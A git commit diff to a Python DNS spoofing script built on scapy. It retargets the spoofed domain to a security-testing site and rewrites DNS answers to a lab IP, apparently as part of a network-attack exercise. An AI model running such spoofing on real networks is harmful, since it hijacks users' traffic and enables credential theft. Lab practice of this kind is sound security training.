5343c125d984dd9c722ffd7897318240f7b7ac5d
Nicole B <48190415+nicbatten@users.noreply.github.com>
2019-08-24 15:59:45 -0400

    Updated test site in code to use a non hsts site
    HSTS was causing the script to not redirect the browser. Switched to a site that isn't in the HSTS list in the browser

--- dns_spoof.py
+++ dns_spoof.py
@@ -21,7 +21,7 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if "www.bing.com" in qname:
+        if "vulnweb.com" in qname:
             print("[+] Spoofing target")
             answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
             scapy_packet[scapy.DNS].an = answer
